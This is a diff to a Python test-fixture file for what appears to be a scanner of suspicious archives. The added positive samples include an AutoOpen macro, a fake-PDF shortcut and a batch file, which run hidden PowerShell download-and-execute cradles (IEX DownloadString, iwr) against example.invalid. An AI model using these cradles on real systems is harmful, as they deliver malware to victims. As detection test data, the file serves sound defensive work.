@@ -5,7 +5,18 @@ recall thật (xem docs/BENCHMARK.md): mẫu do chính người viết luật t�
 
 POSITIVES[tên] = (kết luận tối thiểu, hàm tạo nội dung file nén)
 """
-from helpers import FAKE_EXE, make_pe, make_zip, set_encrypted_flag
+from helpers import (
+    FAKE_EXE,
+    make_docm,
+    make_docx_remote_template,
+    make_lnk,
+    make_pe,
+    make_zip,
+    ps_encoded,
+    set_encrypted_flag,
+    zip_with_hidden,
+    zip_with_overlap,
+)
 
 
 def _exe(*parts):
@@ -69,4 +80,18 @@ POSITIVES = {
     "known_rat_name": ("suspicious", lambda: make_zip({"client.exe": _exe("AsyncRAT", "Pastebin")})),
     "packed_exe": ("suspicious", lambda: make_zip({"setup.exe": _packed()})),
     "encrypted_exe": ("suspicious", lambda: set_encrypted_flag(make_zip({"invoice.exe": FAKE_EXE}))),
+    # --- 0.17: macro tự chạy, template từ xa, LNK gọi LOLBin, PowerShell mã hóa, cấu trúc ZIP bất thường
+    "office_macro_autoexec": ("malicious", lambda: make_zip({"HoaDon.docm": make_docm(
+        b'Sub AutoOpen()\r\n  Shell "powershell -w hidden -c iwr http://example.invalid/a -OutFile a.exe", 0\r\nEnd Sub')})),
+    "remote_template": ("suspicious", lambda: make_zip({"HopDong.docx": make_docx_remote_template(
+        "http://example.invalid/template.dotm")})),
+    "lnk_lolbin_encoded": ("malicious", lambda: make_zip({"Invoice.pdf.lnk": make_lnk(
+        "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "-w hidden -enc " + ps_encoded("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"))})),
+    "bat_encoded_powershell": ("suspicious", lambda: make_zip({"setup.bat": (
+        "@echo off\r\npowershell -nop -w hidden -enc "
+        + ps_encoded("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')")).encode()})),
+    "zip_hidden_entry": ("suspicious", lambda: zip_with_hidden({"readme.txt": b"xin chao"},
+                                                               {"payload.bin": b"\x00" * 64})),
+    "zip_overlap": ("suspicious", lambda: zip_with_overlap("data.txt", b"A" * 4096)),
 }
